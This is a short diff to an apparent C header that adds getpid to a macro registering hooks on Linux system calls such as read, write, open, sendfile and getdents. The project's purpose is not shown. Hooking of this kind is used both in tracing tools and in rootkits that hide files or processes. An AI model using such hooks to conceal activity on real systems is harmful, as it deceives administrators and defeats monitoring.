@@ -18,6 +18,7 @@ struct linux_dirent {
     char d_name[];
 };
 
-INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64)
+INIT_HOOK_HANDLERS(P_SYSCALL_HOOKS, read, write, open, pread64, sendfile, getdents, getdents64,
+                   getpid)
 
 #endif
